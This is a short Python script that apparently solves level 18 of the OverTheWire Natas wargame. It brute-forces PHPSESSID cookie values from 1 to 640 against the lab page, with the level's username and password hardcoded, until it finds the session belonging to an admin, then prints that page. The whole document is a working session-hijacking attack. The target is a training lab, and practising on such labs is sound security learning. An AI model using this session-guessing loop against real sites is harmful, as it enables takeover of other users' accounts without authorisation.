import requests

username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
url = "http://natas18.natas.labs.overthewire.org/index.php"

for natasid in range(1, 641):
    print(f"Attempting: {natasid}", end="\r")
    response = requests.get(url, auth=(username, password),
                            cookies={"PHPSESSID": str(natasid)})
    if "You are an admin" in response.text:
        print(f"\nFound admin session ID: {natasid}")
        print(response.text)
        break